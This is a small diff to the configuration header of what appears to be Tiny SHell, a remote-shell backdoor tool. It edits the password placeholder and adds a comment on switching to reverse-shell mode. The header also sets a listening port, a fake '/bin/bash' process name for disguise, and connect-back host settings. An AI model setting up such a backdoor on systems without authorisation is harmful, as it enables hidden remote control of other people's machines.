@@ -1,11 +1,11 @@
 #ifndef _TSH_H
 #define _TSH_H
 
-char *secret = "replace with your password";
+char *secret = "replace_with_your_password";
 
 #define SERVER_PORT 7586
 #define FAKE_PROC_NAME "/bin/bash"
-
+/* Change to #define for a reverse shell */
 #define CONNECT_BACK_HOST  "localhost"
 #define CONNECT_BACK_DELAY 30
 
